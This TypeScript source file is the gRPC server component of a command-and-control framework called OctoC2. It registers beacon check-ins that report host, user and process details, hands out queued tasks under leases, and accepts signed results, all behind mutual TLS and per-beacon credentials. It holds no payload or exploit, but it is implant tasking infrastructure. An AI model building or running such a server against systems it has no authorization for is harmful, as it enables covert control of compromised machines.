/**
 * OctoC2 Server — BeaconGrpcService
 *
 * gRPC server implementation of BeaconService.
 * Delegates all state management to BeaconRegistry and TaskQueue.
 *
 * Task delivery is protected by mandatory mutual TLS plus a per-beacon bearer
 * credential. Durable leases prevent competing transports from delivering the
 * same task concurrently.
 *
 * Environment variables read by index.ts (not this file):
 *   OCTOC2_GRPC_ENABLED     — Explicit opt-in for the listener
 *   OCTOC2_GRPC_HOST        — Bind host (default: 127.0.0.1)
 *   OCTOC2_GRPC_PORT        — TCP port (default: 50051)
 *   OCTOC2_GRPC_CA_CERT     — Operator CA certificate
 *   OCTOC2_GRPC_SERVER_KEY  — Server private key
 *   OCTOC2_GRPC_SERVER_CERT — Server certificate chain
 *   OCTOC2_GRPC_CLIENT_CERT_FINGERPRINTS — Per-beacon SHA-256 fingerprint map
 */

import * as grpc        from "@grpc/grpc-js";
import * as protoLoader from "@grpc/proto-loader";
import { timingSafeEqual } from "node:crypto";
import { tmpdir }       from "node:os";
import { join }         from "node:path";
import { writeFile, unlink } from "node:fs/promises";
import { PROTO_DEFINITION }  from "@octoc2/shared/proto";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue }      from "../TaskQueue.ts";
import type { CredentialVerifier } from "../services/CredentialVerifier.ts";
import {
  checkinAuthorizesTaskDelivery,
  type BeaconIdentityService,
} from "../services/BeaconIdentityService.ts";
import type { TaskService } from "../services/TaskService.ts";
import {
  canonicalJson,
  type CheckinPayload,
  type TaskResult,
} from "@octoc2/shared";

const DIRECT_DELIVERY_LEASE_MS = 5 * 60_000;

export interface GrpcTlsConfig {
  rootCerts: Buffer;
  privateKey: Buffer;
  certChain: Buffer;
  clientCertificateFingerprints: Readonly<Record<string, string>>;
}

const GRPC_CLIENT_CERTIFICATE_FINGERPRINTS =
  "OCTOC2_GRPC_CLIENT_CERT_FINGERPRINTS";
const SHA256_FINGERPRINT = /^[0-9a-f]{64}$/;
const COLON_SEPARATED_SHA256_FINGERPRINT =
  /^(?:[0-9a-f]{2}:){31}[0-9a-f]{2}$/i;

// ── Internal proto request/response types (keepCase:false → camelCase) ────────

interface CheckinRequest {
  beaconId:  string;
  publicKey: string;
  hostname:  string;
  username:  string;
  os:        string;
  arch:      string;
  pid:       number;
  checkinAt: string;
  identityEnvelope: string;
}

interface ProtoTask {
  id:       string;
  kind:     string;
  argsJson: string;
  issuedAt: string;
}

interface CheckinResponse {
  pendingTasks: ProtoTask[];
}

interface SubmitResultRequest {
  result: {
    taskId:      string;
    beaconId:    string;
    success:     boolean;
    output:      string;
    data:        string;
    completedAt: string;
    signature:   string;
    metadataJson: string;
    hasData:      boolean;
  };
}

interface SubmitResultResponse {
  accepted: boolean;
  message:  string;
}

// ── BeaconGrpcService ─────────────────────────────────────────────────────────

export class BeaconGrpcService {
  private readonly registry: BeaconRegistry;
  private readonly queue:    TaskQueue;
  private readonly credentials: CredentialVerifier;
  private readonly tls: GrpcTlsConfig;
  private readonly identities: BeaconIdentityService;
  private readonly tasks: TaskService;
  private server: grpc.Server | null = null;

  constructor(
    registry: BeaconRegistry,
    queue: TaskQueue,
    credentials: CredentialVerifier,
    tls: GrpcTlsConfig,
    identities: BeaconIdentityService,
    tasks: TaskService,
  ) {
    this.registry = registry;
    this.queue    = queue;
    this.credentials = credentials;
    this.tls = {
      ...tls,
      clientCertificateFingerprints:
        normalizeClientCertificateFingerprintMap(
          tls.clientCertificateFingerprints,
          Object.keys(tls.clientCertificateFingerprints),
          GRPC_CLIENT_CERTIFICATE_FINGERPRINTS,
        ),
    };
    this.identities = identities;
    this.tasks = tasks;
  }

  // ── RPC handlers ─────────────────────────────────────────────────────────────

  /**
   * Beacon calls this each sleep cycle to register/update itself and pick up tasks.
   *
   * 1. Register or update beacon in registry (preserving issueNumber from IssuesChannel).
   * 2. Claim tasks through an exclusive, durable delivery lease.
   * 3. Mark claims delivered only after response construction succeeds.
   * 4. Return tasks over the authenticated mTLS connection.
   */
  checkin = async (
    call: grpc.ServerUnaryCall<CheckinRequest, CheckinResponse>,
    callback: grpc.sendUnaryData<CheckinResponse>
  ): Promise<void> => {
    try {
      const req = call.request;
      const authError = this.authenticate(call, req.beaconId);
      if (authError) {
        callback(authError);
        return;
      }

      if (!req.identityEnvelope) {
        callback({
          code: grpc.status.PERMISSION_DENIED,
          message: "signed check-in envelope is required",
        } as grpc.ServiceError);
        return;
      }
      const payload: CheckinPayload = {
        beaconId: req.beaconId,
        publicKey: req.publicKey,
        hostname: req.hostname,
        username: req.username,
        os: req.os,
        arch: req.arch,
        pid: req.pid,
        checkinAt: req.checkinAt,
        identity: JSON.parse(req.identityEnvelope) as NonNullable<
          CheckinPayload["identity"]
        >,
      };
      const status = await this.identities.verifyAndRegisterCheckin(
        payload,
        req.beaconId,
        4,
        this.registry.get(req.beaconId)?.issueNumber ?? 0,
      );

      const deliveries = checkinAuthorizesTaskDelivery(status)
        ? this.queue.claimDeliveries(
          req.beaconId,
          "codespaces",
          DIRECT_DELIVERY_LEASE_MS,
        )
        : [];
      let tasks: ProtoTask[];
      try {
        tasks = deliveries.map(({ task }) => ({
          id: task.taskId,
          kind: task.kind,
          argsJson: JSON.stringify(task.args),
          issuedAt: task.createdAt,
        }));
        this.queue.finishDeliveries(deliveries, "delivered");
      } catch (error) {
        this.queue.finishDeliveries(
          deliveries,
          "transient_failure",
          error,
        );
        throw error;
      }

      console.log(
        `[gRPC] Checkin: beacon ${req.beaconId} (${req.hostname}) → ${tasks.length} task(s)`
      );

      callback(null, { pendingTasks: tasks });
    } catch (err) {
      console.error("[gRPC] Checkin error:", (err as Error).message);
      callback({
        code:    grpc.status.PERMISSION_DENIED,
        message: (err as Error).message,
      } as grpc.ServiceError);
    }
  };

  /**
   * Beacon submits a completed task result.
   *
   * Enforces task ownership and idempotent duplicate-result semantics.
   */
  submitResult = async (
    call: grpc.ServerUnaryCall<SubmitResultRequest, SubmitResultResponse>,
    callback: grpc.sendUnaryData<SubmitResultResponse>
  ): Promise<void> => {
    try {
      const authenticated = this.authenticateCaller(call);
      if ("error" in authenticated) {
        callback(authenticated.error);
        return;
      }
      const result = call.request.result;

      if (!result) {
        callback(null, { accepted: false, message: "missing result field" });
        return;
      }

      if (authenticated.principal !== result.beaconId) {
        callback({
          code: grpc.status.PERMISSION_DENIED,
          message: "credential does not match beaconId",
        } as grpc.ServiceError);
        return;
      }

      let metadata: Record<string, unknown> | undefined;
      try {
        metadata = parseTaskResultMetadata(result.metadataJson ?? "");
      } catch (error) {
        callback({
          code: grpc.status.INVALID_ARGUMENT,
          message: (error as Error).message,
        } as grpc.ServiceError);
        return;
      }

      // `data` predates the explicit presence bit. Preserve compatibility with
      // older clients for non-empty values while allowing new clients to carry
      // a deliberately present empty string without changing the signed shape.
      const hasData = result.hasData || result.data.length > 0;
      const taskResult: TaskResult = {
        taskId: result.taskId,
        beaconId: result.beaconId,
        success: result.success,
        output: result.output,
        ...(hasData ? { data: result.data } : {}),
        completedAt: result.completedAt,
        ...(result.signature ? { signature: result.signature } : {}),
        ...(metadata !== undefined ? { metadata } : {}),
      };
      const outcome = await this.tasks.acceptSignedResult(
        taskResult,
        result.beaconId,
      );

      if (outcome.status === "completed" || outcome.status === "exact_duplicate") {
        console.log(`[gRPC] SubmitResult: task ${result.taskId} completed (success=${result.success})`);
        callback(null, { accepted: true, message: outcome.status });
      } else {
        callback(null, { accepted: false, message: outcome.status });
      }
    } catch (err) {
      console.error("[gRPC] SubmitResult error:", (err as Error).message);
      callback({
        code:    grpc.status.INTERNAL,
        message: (err as Error).message,
      } as grpc.ServiceError);
    }
  };

  // ── Lifecycle ─────────────────────────────────────────────────────────────────

  /** Load proto, create gRPC Server, bind to port. Resolves when listening. */
  async start(port: number, host = "127.0.0.1"): Promise<number> {
    const packageDef = await this.loadProto();
    const proto = grpc.loadPackageDefinition(packageDef) as Record<string, unknown>;
    const pkg   = proto["svc"] as Record<string, unknown>;
    const BeaconServiceDef = pkg["BeaconService"] as grpc.ServiceClientConstructor & {
      service: grpc.ServiceDefinition;
    };

    this.server = new grpc.Server();
    this.server.addService(BeaconServiceDef.service, {
      checkin:      this.checkin,
      submitResult: this.submitResult,
    });

    return new Promise((resolve, reject) => {
      this.server!.bindAsync(
        `${host}:${port}`,
        grpc.ServerCredentials.createSsl(
          this.tls.rootCerts,
          [{ private_key: this.tls.privateKey, cert_chain: this.tls.certChain }],
          true,
        ),
        (err, boundPort) => {
          if (err) {
            reject(err);
            return;
          }
          console.log(`[gRPC] BeaconService listening on port ${boundPort}`);
          resolve(boundPort);
        }
      );
    });
  }

  /** Graceful shutdown — waits for in-flight calls to complete. */
  stop(): Promise<void> {
    if (!this.server) return Promise.resolve();
    return new Promise((resolve) => {
      this.server!.tryShutdown((err) => {
        if (err) {
          this.server!.forceShutdown();
        }
        this.server = null;
        resolve();
      });
    });
  }

  // ── Private helpers ───────────────────────────────────────────────────────────

  private async loadProto(): Promise<protoLoader.PackageDefinition> {
    const tmpFile = join(tmpdir(), `svc-server-${process.pid}.proto`);
    await writeFile(tmpFile, PROTO_DEFINITION, "utf8");
    try {
      return await protoLoader.load(tmpFile, {
        keepCase: false,
        longs:    String,
        enums:    String,
        defaults: true,
        oneofs:   true,
      });
    } finally {
      try { await unlink(tmpFile); } catch { /* best-effort */ }
    }
  }

  private authenticate(
    call: grpc.ServerUnaryCall<unknown, unknown>,
    claimedBeaconId: string,
  ): grpc.ServiceError | null {
    const authenticated = this.authenticateCaller(call);
    if ("error" in authenticated) return authenticated.error;
    if (authenticated.principal !== claimedBeaconId) {
      return {
        code: grpc.status.PERMISSION_DENIED,
        message: "credential does not match beaconId",
      } as grpc.ServiceError;
    }
    return null;
  }

  private authenticateCaller(
    call: grpc.ServerUnaryCall<unknown, unknown>,
  ): { principal: string } | { error: grpc.ServiceError } {
    const principal = this.credentials.authenticateGrpcMetadata(
      call.metadata.get("authorization"),
    );
    if (!principal) {
      return {
        error: {
          code: grpc.status.UNAUTHENTICATED,
          message: "missing or invalid beacon credential",
        } as grpc.ServiceError,
      };
    }
    const expectedFingerprint =
      this.tls.clientCertificateFingerprints[principal];
    if (!expectedFingerprint) {
      return {
        error: {
          code: grpc.status.PERMISSION_DENIED,
          message: "no client certificate is bound to beacon credential",
        } as grpc.ServiceError,
      };
    }

    let peerFingerprint: string | null = null;
    try {
      const peerCertificate = call.getAuthContext().sslPeerCertificate;
      if (peerCertificate) {
        peerFingerprint = normalizeSha256Fingerprint(
          peerCertificate.fingerprint256,
          "peer client certificate fingerprint",
        );
      }
    } catch {
      peerFingerprint = null;
    }
    if (!peerFingerprint) {
      return {
        error: {
          code: grpc.status.UNAUTHENTICATED,
          message: "authenticated client certificate is required",
        } as grpc.ServiceError,
      };
    }
    if (!timingSafeEqual(
      Buffer.from(peerFingerprint, "hex"),
      Buffer.from(expectedFingerprint, "hex"),
    )) {
      return {
        error: {
          code: grpc.status.PERMISSION_DENIED,
          message: "client certificate does not match beacon credential",
        } as grpc.ServiceError,
      };
    }
    return { principal };
  }
}

export function parseGrpcClientCertificateFingerprintMap(
  raw: string,
  expectedPrincipals: readonly string[],
  variableName = GRPC_CLIENT_CERTIFICATE_FINGERPRINTS,
): Record<string, string> {
  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    throw new Error(
      `${variableName} must be a JSON object mapping beacon IDs to SHA-256 certificate fingerprints`,
    );
  }
  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
    throw new Error(
      `${variableName} must be a JSON object mapping beacon IDs to SHA-256 certificate fingerprints`,
    );
  }
  return normalizeClientCertificateFingerprintMap(
    parsed as Record<string, unknown>,
    expectedPrincipals,
    variableName,
  );
}

function normalizeClientCertificateFingerprintMap(
  values: Readonly<Record<string, unknown>>,
  expectedPrincipals: readonly string[],
  variableName: string,
): Record<string, string> {
  const normalized: Array<[string, string]> = [];
  const principals = new Set<string>();
  const fingerprints = new Set<string>();
  for (const [rawPrincipal, rawFingerprint] of Object.entries(values)) {
    const principal = rawPrincipal.trim();
    if (!principal || typeof rawFingerprint !== "string") {
      throw new Error(
        `${variableName} must map non-empty beacon IDs to string SHA-256 certificate fingerprints`,
      );
    }
    if (principals.has(principal)) {
      throw new Error(
        `${variableName} contains duplicate beacon ID '${principal}' after normalization`,
      );
    }
    const fingerprint = normalizeSha256Fingerprint(
      rawFingerprint,
      `${variableName}[${JSON.stringify(principal)}]`,
    );
    if (fingerprints.has(fingerprint)) {
      throw new Error(
        `${variableName} must bind a distinct client certificate to each beacon`,
      );
    }
    normalized.push([principal, fingerprint]);
    principals.add(principal);
    fingerprints.add(fingerprint);
  }

  const expected = new Set<string>();
  for (const rawPrincipal of expectedPrincipals) {
    const principal = rawPrincipal.trim();
    if (!principal || expected.has(principal)) {
      throw new Error("configured beacon credential principals must be unique and non-empty");
    }
    expected.add(principal);
  }
  const missing = [...expected].filter((principal) => !principals.has(principal));
  const unexpected = [...principals].filter((principal) => !expected.has(principal));
  if (
    principals.size === 0 ||
    missing.length > 0 ||
    unexpected.length > 0
  ) {
    const details = [
      ...(missing.length > 0 ? [`missing ${missing.join(", ")}`] : []),
      ...(unexpected.length > 0
        ? [`unexpected ${unexpected.join(", ")}`]
        : []),
    ];
    throw new Error(
      `${variableName} must contain exactly one fingerprint for every configured beacon credential${
        details.length > 0 ? ` (${details.join("; ")})` : ""
      }`,
    );
  }
  return Object.fromEntries(normalized);
}

function normalizeSha256Fingerprint(
  value: string,
  label: string,
): string {
  const trimmed = value.trim();
  const normalized = COLON_SEPARATED_SHA256_FINGERPRINT.test(trimmed)
    ? trimmed.replaceAll(":", "").toLowerCase()
    : trimmed.toLowerCase();
  if (!SHA256_FINGERPRINT.test(normalized)) {
    throw new Error(
      `${label} must be a 64-digit hexadecimal SHA-256 certificate fingerprint`,
    );
  }
  return normalized;
}

function parseTaskResultMetadata(
  serialized: string,
): Record<string, unknown> | undefined {
  if (serialized.length === 0) return undefined;

  let parsed: unknown;
  try {
    parsed = JSON.parse(serialized);
  } catch {
    throw new TypeError("result metadata_json must be valid JSON");
  }
  if (
    typeof parsed !== "object" ||
    parsed === null ||
    Array.isArray(parsed)
  ) {
    throw new TypeError("result metadata_json must encode an object");
  }
  if (canonicalJson(parsed) !== serialized) {
    throw new TypeError("result metadata_json must use canonical JSON");
  }
  return parsed as Record<string, unknown>;
}
